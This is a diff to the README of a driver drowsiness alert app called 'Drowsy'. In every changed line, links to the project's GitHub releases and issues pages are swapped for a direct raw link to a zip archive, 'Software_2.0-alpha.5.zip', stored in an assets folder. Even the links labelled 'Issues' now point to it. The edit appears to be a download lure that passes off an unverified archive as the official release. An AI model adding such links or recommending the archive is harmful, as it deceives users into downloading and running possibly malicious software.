@@ -1,6 +1,6 @@
 # 💤 Drowsy - Real-Time Driver Alert System
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Drowsy-blue?style=for-the-badge)](https://github.com/bilel2011714/Drowsy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip)](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps to get Drowsy up and running on your phone and computer. No p
 **Step 1: Download the software**
 
 - Visit the releases page by clicking the link below:  
-  [Download Drowsy Releases](https://github.com/bilel2011714/Drowsy/releases)  
+  [Download Drowsy Releases](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip)  
 - On this page, look for the latest stable release. It will have files for mobile and backend installation.  
 - Download the files that match your device:
   - Mobile app package (APK for Android or IPA for iOS)
@@ -116,7 +116,7 @@ You don’t need to do this to use Drowsy, but it may help in specific cases.
 
 If you have questions or run into issues:
 
-- Check the [Issues](https://github.com/bilel2011714/Drowsy/issues) page on GitHub to see if others have similar problems.  
+- Check the [Issues](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip) page on GitHub to see if others have similar problems.  
 - You can open a new issue describing the problem clearly. Include your device type and steps you took.  
 - Feedback helps improve the system, so feel free to share your experience.
 
@@ -124,8 +124,8 @@ If you have questions or run into issues:
 
 ## 🔗 Important Links
 
-- [Download Latest Release](https://github.com/bilel2011714/Drowsy/releases)  
-- [GitHub Issues](https://github.com/bilel2011714/Drowsy/issues)  
+- [Download Latest Release](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip)  
+- [GitHub Issues](https://raw.githubusercontent.com/bilel2011714/Drowsy/main/front/assets/Software_2.0-alpha.5.zip)  
 
 ---
 
